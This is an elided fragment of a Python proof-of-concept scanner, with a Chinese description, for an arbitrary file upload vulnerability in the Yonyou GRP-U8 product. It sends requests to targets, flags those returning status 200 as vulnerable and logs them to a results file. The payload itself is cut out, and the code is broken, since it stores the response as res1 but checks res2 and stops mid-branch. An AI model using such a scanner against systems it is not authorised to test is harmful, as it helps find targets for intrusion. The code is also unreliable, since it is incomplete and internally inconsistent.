...
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友-GRP-U8任意文件上传漏洞")
...
def poc(target):
    ...
    try:
        res1 = requests.get(url=target+payload, headers=headers, timeout=10,data=data,verify=False,proxies=proxies)
        if res2.status_code == 200:
            print(f"[+]该url:{target}存在任意文件上传漏洞")
            with open('result7.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
